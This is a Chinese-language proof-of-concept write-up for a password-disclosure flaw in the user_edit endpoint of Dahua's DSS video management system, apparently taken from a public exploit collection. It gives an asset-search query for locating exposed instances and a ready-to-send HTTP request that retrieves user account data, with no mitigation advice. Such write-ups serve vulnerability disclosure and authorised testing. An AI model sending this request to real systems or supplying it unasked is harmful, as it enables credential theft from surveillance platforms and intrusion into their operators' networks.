# 大华 DSS 视频管理系统user_edit存在密码泄漏漏洞

# 一、漏洞简介
DSS是大华的大型监控管理应用平台，支持几乎所有涉及监挂控等方面的操作，支持多级跨平台联网等操作。可将视频监控、卡口拍照、区间测速、电子地图、违章查询系统等诸多主流应用整合在一起，实现更加智能、便捷的分级查询服务。大华 DSS 视频管理系统user_edit存在密码泄漏漏洞。

# 二、影响版本
+ 大华 DSS 视频管理系统

# 三、资产测绘
+ hunter：`app.name=="Dahua 大华 DSS 视频管理系统"`


+ 登录页面


# 四、漏洞复现
```plain
GET /admin/cascade_/user_edit.action?id=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=1B1D0EBCE3AC082FDBA00062678EAAC9; JSESSIONID=48C3365B18E192DAAB020C90A2BF0DEF
Upgrade-Insecure-Requests: 1
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gsq90pf8xgsyfgix>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
